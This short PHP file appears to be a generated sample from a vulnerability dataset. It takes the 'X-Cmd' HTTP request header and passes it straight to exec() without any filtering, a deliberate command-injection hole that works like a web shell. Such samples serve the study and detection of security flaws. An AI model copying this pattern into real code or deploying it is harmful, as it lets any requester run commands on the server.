<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_DIRECT; SKELETON=S0; KEY=cmd; SINK=B2; VAR=v0173; HDR_NAME=X-Cmd */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = (string)($h["X-Cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B2($inp);
echo (string)($out);
?>
